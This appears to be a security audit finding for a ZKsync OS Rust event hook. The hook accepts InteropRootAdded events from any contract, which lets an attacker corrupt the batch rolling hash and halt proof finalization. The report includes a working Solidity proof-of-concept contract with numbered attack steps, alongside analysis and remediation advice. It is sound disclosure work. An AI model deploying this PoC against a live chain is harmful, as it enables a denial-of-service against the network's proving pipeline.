### Title
Unvalidated Emitter Address in `interop_root_reporter_event_hook` Allows Arbitrary Interop Root Injection and Rolling Hash Corruption - (File: `system_hooks/src/event_hooks/interop_root_reporter.rs`)

---

### Summary

The `interop_root_reporter_event_hook` processes `InteropRootAdded` events solely by matching the event signature, with no validation of which contract emitted the event. Any unprivileged EVM contract can emit this event to inject arbitrary `InteropRoot` entries into `InteropRootStorage`. Because `InteropRootStorage::push_root` performs no deduplication or ordering checks, and `calculate_interop_roots_rolling_hash` blindly folds every stored root into the batch public input, an attacker can corrupt the `interop_roots_rolling_hash` field of the batch PI, causing the settlement layer to reject the batch proof — a denial-of-service against the proving pipeline analogous to the reported state-proof-dependency DoS.

---

### Finding Description

**Root cause — no emitter address check in the event hook:**

`interop_root_reporter_event_hook` in `system_hooks/src/event_hooks/interop_root_reporter.rs` has the signature:

```rust
pub fn interop_root_reporter_event_hook<S: EthereumLikeTypes>(
    topics: &arrayvec::ArrayVec<...>,
    data: &[u8],
    _caller_ee: u8,          // execution-environment type, NOT the emitter address
    system: &mut System<S>,
    resources: &mut S::Resources,
) -> Result<(), SystemError>
```

There is no `emitter_address` parameter. The only guard is a signature match:

```rust
if topics.is_empty() || topics[0].as_u8_array() != INTEROP_ROOT_ADDED_EVENT_SIG {
    return Ok(());
}
```

After that, the hook unconditionally parses `chain_id`, `block_or_batch_number`, and `root` from the event topics/data and calls `system.io.add_interop_root(...)` with no further validation of the emitting contract.

**No deduplication or ordering in `InteropRootStorage::push_root`:**

```rust
pub fn push_root(&mut self, interop_root: InteropRoot) -> Result<(), SystemError> {
    self.list.push(interop_root, ());
    Ok(())
}
```

Every root is appended unconditionally. The same `(chain_id, block_or_batch_number)` pair can appear multiple times with different `root` values.

**Rolling hash folds every stored root:**

`calculate_interop_roots_rolling_hash` iterates over the entire `InteropRootStorage` list:

```rust
for root in roots {
    data[0..32].copy_from_slice(&rolling_hash.as_u8_ref());
    data[32..64].copy_from_slice(&root.chain_id.to_be_bytes::<{ U256::BYTES }>());
    data[64..96].copy_from_slice(&root.block_or_batch_number.to_be_bytes::<{ U256::BYTES }>());
    hasher.update(data);
    hasher.update(root.root.as_u8_ref());
    rolling_hash = hasher.finalize_reset().into()
}
```

Injected roots are indistinguishable from legitimate ones and permanently alter the final hash.

**The corrupted hash reaches the batch public input:**

For single-block batches the hash is committed directly:

```rust
let interop_roots_rolling_hash = calculate_interop_roots_rolling_hash(
    Bytes32::zero(),
    io.interop_root_storage.iter(),
    &mut crypto::sha3::Keccak256::new(),
);
// ...
let batch_output = BatchOutput {
    // ...
    interop_roots_rolling_hash,
    // ...
};
```

For multi-block batches it is accumulated across blocks in `ZKBatchDataKeeper::apply_block`:

```rust
self.interop_roots_rolling_hash = calculate_interop_roots_rolling_hash(
    self.interop_roots_rolling_hash,
    interop_roots,
    &mut crypto::sha3::Keccak256::new(),
);
```

The final `BatchPublicInput` (and its on-chain hash) therefore reflects the injected roots, making the proof unverifiable against the settlement layer's expected state.

---

### Impact Explanation

An attacker who can execute an EVM transaction (any unprivileged user) can deploy a contract that emits `InteropRootAdded` with the correct ABI encoding. Because the hook fires on signature match alone, the injected `InteropRoot` entries are stored and folded into `interop_roots_rolling_hash`. The resulting batch public input hash will not match what the settlement layer expects, causing every batch proof that includes the attacker's block to be rejected. By repeating the injection in every block the attacker can sustain a continuous DoS against the proving pipeline, preventing any batch from being finalized on the settlement layer.

---

### Likelihood Explanation

Any account with ETH to pay gas can deploy a contract and call it. No privileged role, leaked key, or governance majority is required. The only prerequisite is that the attacker's transaction is included in a block, which is the normal sequencer flow. Likelihood is therefore **medium**: the attack is cheap and repeatable, but depends on the sequencer including the attacker's transaction.

---

### Recommendation

1. **Add emitter address validation** to `interop_root_reporter_event_hook`. Pass the emitting contract's address as a parameter and reject events not originating from `L2_INTEROP_ROOT_STORAGE_ADDRESS`:
   ```rust
   if emitter != L2_INTEROP_ROOT_STORAGE_ADDRESS {
       return Ok(());
   }
   ```
2. **Add uniqueness enforcement** in `InteropRootStorage::push_root` to reject duplicate `(chain_id, block_or_batch_number)` pairs.
3. **Enforce monotonically increasing `block_or_batch_number`** per `chain_id` to prevent out-of-order injection.
4. **Enforce `chain_id != 0`** in the hook (the struct comment already states this invariant but it is not enforced in code).

---

### Proof of Concept

```solidity
// Attacker contract (deployed on ZKsync OS EVM)
contract InteropRootSpammer {
    // keccak256("InteropRootAdded(uint256,uint256,bytes32[])")
    bytes32 constant SIG =
        0x6b451b8422636e45b93bf7f594fa2c1769d039766c4254a6e7f9c0ee1715cdb0;

    function spam(uint256 chainId, uint256 blockNum, bytes32 root) external {
        // Emit the event that interop_root_reporter_event_hook listens for.
        // ABI-encoded data: offset=32, len=1, root
        bytes memory data = abi.encode(uint256(32), uint256(1), root);
        assembly {
            log3(
                add(data, 32), mload(data),
                SIG,
                chainId,
                blockNum
            )
        }
    }
}
```

1. Attacker deploys `InteropRootSpammer`.
2. Attacker calls `spam(1, 999, 0xdeadbeef...)` in a normal EVM transaction.
3. `interop_root_reporter_event_hook` fires, passes all format checks, and calls `add_interop_root` with the attacker-supplied values.
4. `InteropRootStorage::push_root` appends the fake root.
5. At block/batch finalization, `calculate_interop_roots_rolling_hash` folds the fake root into `interop_roots_rolling_hash`.
6. The batch public input hash diverges from the settlement layer's expectation; the batch proof is rejected.
7. Repeating in every block sustains the DoS.

---

**Key file references:** [1](#0-0) [2](#0-1) [3](#0-2) [4](#0-3) [5](#0-4)

### Citations

**File:** system_hooks/src/event_hooks/interop_root_reporter.rs (L19-81)
```rust
pub fn interop_root_reporter_event_hook<S: EthereumLikeTypes>(
    topics: &arrayvec::ArrayVec<<S::IOTypes as SystemIOTypesConfig>::EventKey, MAX_EVENT_TOPICS>,
    data: &[u8],
    _caller_ee: u8,
    system: &mut System<S>,
    resources: &mut S::Resources,
) -> Result<(), SystemError>
where
{
    // First, ensure we're capturing the InteropRootAdded event
    if topics.is_empty() || topics[0].as_u8_array() != INTEROP_ROOT_ADDED_EVENT_SIG {
        return Ok(());
    }
    // Internal error if the data supplied doesn't match the expected value
    if data.len() != 96 {
        return Err(internal_error!("Interop root reporter event hook received bad data").into());
    }

    // Parse data
    let offset: u32 = match U256::from_be_slice(&data[..32]).try_into() {
        Ok(offset) => offset,
        Err(_) => {
            return Err(
                internal_error!("Interop root reporter event hook received bad offset").into(),
            );
        }
    };
    // This event is part of the system, but we check it anyways
    if offset != 32 {
        return Err(internal_error!("Interop root reporter event hook received bad offset").into());
    }

    let len: u32 = match U256::from_be_slice(&data[32..64]).try_into() {
        Ok(offset) => offset,
        Err(_) => {
            return Err(
                internal_error!("Interop root reporter event hook received bad length").into(),
            );
        }
    };
    // It should have exactly one side
    if len != 1 {
        return Err(internal_error!("Interop root reporter event hook received bad length").into());
    }
    // Validate topics length
    if topics.len() != 3 {
        return Err(internal_error!("Interop root reporter event hook received bad topics").into());
    }

    let root = Bytes32::from_array(data[64..96].try_into().unwrap());
    let chain_id = U256::from_be_bytes(topics[1].as_u8_array());
    let block_or_batch_number = U256::from_be_bytes(topics[2].as_u8_array());
    system.io.add_interop_root(
        ExecutionEnvironmentType::NoEE,
        resources,
        InteropRoot {
            root,
            block_or_batch_number,
            chain_id,
        },
    )?;

    Ok(())
```

**File:** zk_ee/src/common_structs/interop_root_storage.rs (L41-45)
```rust
    pub fn push_root(&mut self, interop_root: InteropRoot) -> Result<(), SystemError> {
        self.list.push(interop_root, ());

        Ok(())
    }
```

**File:** basic_bootloader/src/bootloader/block_flow/zk/post_tx_op/mod.rs (L107-128)
```rust
pub fn calculate_interop_roots_rolling_hash<'a>(
    old_rolling_hash: Bytes32,
    roots: impl Iterator<Item = &'a InteropRoot>,
    hasher: &mut crypto::sha3::Keccak256,
) -> Bytes32 {
    let mut data = [0u8; 96];

    let mut rolling_hash = old_rolling_hash;
    for root in roots {
        data[0..32].copy_from_slice(&rolling_hash.as_u8_ref());
        data[32..64].copy_from_slice(&root.chain_id.to_be_bytes::<{ U256::BYTES }>());
        data[64..96].copy_from_slice(&root.block_or_batch_number.to_be_bytes::<{ U256::BYTES }>());
        hasher.update(data);

        // Note: now we have only one side
        hasher.update(root.root.as_u8_ref());

        rolling_hash = hasher.finalize_reset().into()
    }

    rolling_hash
}
```

**File:** basic_bootloader/src/bootloader/block_flow/zk/batch_data.rs (L103-107)
```rust
        self.interop_roots_rolling_hash = calculate_interop_roots_rolling_hash(
            self.interop_roots_rolling_hash,
            interop_roots,
            &mut crypto::sha3::Keccak256::new(),
        );
```

**File:** basic_bootloader/src/bootloader/block_flow/zk/post_tx_op/post_tx_op_proving_singleblock_batch.rs (L114-118)
```rust
        let interop_roots_rolling_hash = calculate_interop_roots_rolling_hash(
            Bytes32::zero(),
            io.interop_root_storage.iter(),
            &mut crypto::sha3::Keccak256::new(),
        );
```
